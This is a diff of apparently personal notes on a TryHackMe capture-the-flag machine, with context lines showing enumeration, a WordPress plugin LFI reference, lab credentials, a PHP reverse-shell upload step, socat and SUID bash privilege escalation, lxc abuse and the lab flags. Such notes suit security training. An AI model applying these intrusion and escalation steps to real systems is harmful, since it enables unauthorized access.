@@ -129,8 +129,6 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 15.99 seconds
 
-
-
 nothing
 
 ┌──(kali㉿kali)-[~]
@@ -163,7 +161,6 @@ drwxr-xr-x    2 0        115          4096 Oct 06  2020 ..
 226 Directory send OK.
 ftp> quit
 221 Goodbye.
-
 
 ┌──(kali㉿kali)-[~]
 └─$ gobuster dir -u http://10.10.157.71/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -k
@@ -308,9 +305,7 @@ Interesting Finding(s):
 [+] Memory used: 228.457 MB
 [+] Elapsed time: 00:00:19
 
-
 elyana
-
 
 -   e enumerate
 -   u users
@@ -437,7 +432,6 @@ Con MailMasta, puede crear plantillas de correo electrónico personalizadas y se
 En resumen, MailMasta es una herramienta útil para cualquier persona que desee enviar correos masivos a través de su sitio web de WordPress, ya sea para promocionar un producto o servicio, compartir noticias o actualizaciones, o simplemente mantenerse en contacto con sus suscriptores.
 
 https://www.exploit-db.com/exploits/40290  (LFI)
-
 
 reflex-gallery 3.1.7
 
@@ -627,7 +621,6 @@ login elyana: H@ckme@123
 
 http://10.10.161.184/wordpress/wp-login.php?redirect_to=http%3A%2F%2F10.10.161.184%2Fwordpress%2Fwp-admin%2F&reauth=1
 
-
 or can be with revshell php from pentestmonkey
 
 go to appearance and theme editor and upload agent.php
@@ -747,10 +740,8 @@ Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-118-generic x86_64)
   Memory usage: 68%               IP address for eth0: 10.10.161.184
   Swap usage:   0%
 
-
 16 packages can be updated.
 0 updates are security updates.
-
 
 Last login: Fri Oct  9 08:09:56 2020
 -bash-4.4$ whoami
@@ -766,7 +757,6 @@ Matching Defaults entries for elyana on elyana:
 
 User elyana may run the following commands on elyana:
     (ALL) NOPASSWD: /usr/bin/socat
-
 
 ┌──(kali㉿kali)-[~]
 └─$ socat file:`tty`,raw,echo=0 tcp-listen:3333
@@ -786,7 +776,6 @@ VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9
 ┌──(kali㉿kali)-[~]
 └─$ echo 'VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9' |base64 -d
 THM{uem2wigbuem2wigb68sn2j1ospi868sn2j1ospi8}    
-
 
 another way
 
@@ -849,7 +838,6 @@ or
 -rwsr-xr-x 1 root   root        99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
 
 https://gtfobins.github.io/gtfobins/bash/
-
 
 -bash-4.4$ /bin/bash -p
 bash-4.4# whoami
@@ -941,7 +929,6 @@ systemd-private-924375ecefe542fc90745e2f73214a17-apache2.service-7jrI0u
 systemd-private-924375ecefe542fc90745e2f73214a17-systemd-resolved.service-8CHgwF
 systemd-private-924375ecefe542fc90745e2f73214a17-systemd-timesyncd.service-kFmtRd
 
-
 -bash-4.4$ lxc image import ./alpine-v3.16-x86_64-20220919_1406.tar.gz --alias alpine
 Image imported with fingerprint: 46ea16cf67c2a57b3995b13e0111f75abd5618ac91147f47559fb22c8ee884d7
 -bash-4.4$ lxc image list
@@ -970,15 +957,7 @@ VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9
 
 Was really fun!
 
-
 ```
-
-![[Pasted image 20221225122239.png]]
-
-![[Pasted image 20221225142300.png]]
-![[Pasted image 20221225142640.png]]
-
-![[Pasted image 20221225142735.png]]
 
 user.txt
 
@@ -987,6 +966,5 @@ user.txt
 root.txt
 
 *THM{uem2wigbuem2wigb68sn2j1ospi868sn2j1ospi8}*
-
 
 [[Poster]]
